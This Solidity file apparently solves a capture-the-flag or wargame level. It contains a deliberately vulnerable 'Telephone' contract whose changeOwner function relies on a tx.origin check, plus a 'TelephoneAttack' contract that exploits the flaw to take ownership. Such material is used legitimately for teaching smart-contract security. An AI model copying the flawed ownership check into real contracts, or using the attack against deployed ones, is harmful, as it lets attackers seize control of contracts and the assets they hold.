// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttack {
    Telephone public telephone;
    
    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }
    
    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}